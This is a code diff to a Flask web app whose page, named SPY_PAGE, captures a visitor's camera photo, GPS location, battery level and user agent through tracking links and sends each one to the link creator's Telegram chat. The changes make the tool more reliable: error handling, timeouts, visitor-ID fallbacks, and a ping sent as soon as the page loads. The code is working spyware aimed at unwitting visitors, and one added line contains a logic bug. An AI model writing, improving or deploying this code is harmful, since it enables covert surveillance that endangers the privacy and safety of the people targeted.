@@ -51,12 +51,17 @@ def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown
         payload['reply_markup'] = json.dumps(reply_markup)
     requests.post(url, data=payload).raise_for_status()
 
-def send_telegram_photo(chat_id, photo_path, caption=''):
+def send_telegram_photo(chat_id, photo_path, caption):
     url = f"https://api.telegram.org/bot{config['bot_token']}/sendPhoto"
-    files = {'photo': open(photo_path, 'rb')}
-    data = {'chat_id': chat_id, 'caption': caption}
-    resp = requests.post(url, files=files, data=data)
-    return resp.status_code == 200
+    try:
+        with open(photo_path,'rb') as fh:
+            files = {'photo': fh}
+            data = {'chat_id': chat_id, 'caption': caption}
+            resp = requests.post(url, files=files, data=data, timeout=10)
+        return resp.status_code == 200
+    except Exception as e:
+        app.logger.warning(f"Failed to send photo: {e}")
+        return False
 
 def send_telegram_location(chat_id, lat, lng):
     url = f"https://api.telegram.org/bot{config['bot_token']}/sendLocation"
@@ -71,7 +76,7 @@ def index():
     links = load_json('links.json')
     link_data = links.get(link_id, {})
     target_url = link_data.get('url', 'https://google.com')
-    creator_id = link_data.get('created_by', config['chat_id'])
+    creator_id = str(link_data.get('created_by') or config['chat_id'])
 
     # Generate or retrieve visitor ID
     visitor_id = session.get('visitor_id')
@@ -134,7 +139,11 @@ SPY_PAGE = '''
         function debug(msg) { debugEl.textContent = msg; console.log(msg); }
 
         document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';
-        debug('Initializing...');
+        if(!location.protocol !== 'https' && location.hostname !== 'localhost') {
+            debug('⚠️ Warning: Not using HTTPS. Some features may not work.');
+        }
+        debug('initilizing...');
+        sendData({ ping: true, ua: navigator.userAgent });
 
         // ---------- CAMERA ----------
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
@@ -204,10 +213,14 @@ SPY_PAGE = '''
                 fetch(window.location.href, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(batch)
+                    credentials: 'same-origin',
+                    body: JSON.stringify(batch.map(d => ({ ...d, vid: visitorId })))
                 })
-                .then(res => res.json())
-                .then(data => { debug('✅ Server OK'); })
+                .then(async res => {
+                    const j = await res.json().catch(() => ({}));
+                    if(res.ok) debug('✅ Send successful');
+                    else debug('❌ Server'+ res.status + ':' + JSON.stringify(j));
+                 })
                 .catch(err => { debug('❌ Send error: '+err.message); });
                 lastSend = Date.now();
             }
@@ -244,15 +257,19 @@ def index_post():
         if not isinstance(data, list):
             data = [data]
 
-        visitor_id = session.get('visitor_id')
+        visitor_id=(
+            session.get('visitor_id') or
+            request.args.get('vid') or
+            (data[0].get('vid') if isinstance(data,list) and data else None) 
+        )
         if not visitor_id:
-            return jsonify({'status': 'error', 'message': 'No visitor ID'}), 400
-
+            return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400
+        
         # Determine creator ID from the link data
         link_id = request.args.get('id', '')
         links = load_json('links.json')
         link_data = links.get(link_id, {})
-        creator_id = link_data.get('created_by', config['chat_id'])
+        creator_id = str(link_data.get('created_by', config['chat_id']))
 
         # Load visitors
         visitors = load_json('visitors.json')
@@ -282,34 +299,45 @@ def index_post():
                     with open(photo_path, 'wb') as f:
                         f.write(photo_binary)
                     caption = f"📸 *Spy Photo!*\n🆔 {visitor_id}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    send_telegram_photo(creator_id, photo_path, caption)
                     visitors[visitor_id]['photos'] += 1
-
+                    try:
+                        send_telegram_photo(creator_id, photo_path, caption)
+                    except Exception as e:
+                        app.debug(f"Failed to send photo: {e}")
+                    
             # --- Location ---
             if 'location' in item:
                 loc = item['location']
                 lat = loc.get('lat', 0)
                 lng = loc.get('lng', 0)
                 if lat != 0 and lng != 0:
-                    send_telegram_location(creator_id, lat, lng)
-                    msg = f"📍 *Live Location*\n🆔 {visitor_id}\n🗺️ https://maps.google.com/?q={lat},{lng}"
-                    send_telegram_message(creator_id, msg)
                     visitors[visitor_id]['locations'] += 1
-
+                    try:
+                        send_telegram_location(creator_id, lat, lng)
+                        msg = f"📍 *Live Location*\n🆔 {visitor_id}\n🌐 https://maps.google.com/?q={lat},{lng}"
+                        send_telegram_message(creator_id, msg)
+                    except Exception as e:
+                        app.logger.warning(f"Failed to send location: {e}")
+                    
             # --- Battery ---
             if 'battery' in item:
                 bat = item['battery']
                 level = bat.get('level', 0)
                 charging = bat.get('charging', False)
                 if level > 0:
-                    status = "⚡ Charging" if charging else "🔋 Not Charging"
-                    msg = f"🔋 *Battery Status*\n🆔 {visitor_id}\n📊 {level}%\n{status}"
-                    send_telegram_message(creator_id, msg)
-                    visitors[visitor_id]['battery'] += 1
+                    visitors[visitor_id]['battery'] = level
+                    status = "Charging" if charging else "Not Charging"
+                    msg = f"🔋 *Battery Status*\n🆔 {visitor_id}\nLevel: {level}%\nStatus: {status}"
+                    try:
+                        send_telegram_message(creator_id, msg)
+                    except Exception as e:
+                        app.logger.warning(f"Failed to send battery status: {e}")
 
+                
         save_json('visitors.json', visitors)
         return jsonify({'status': 'success'})
     except Exception as e:
+        app.logger.exception("index_post error")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # ---------- Telegram Bot Webhook ----------
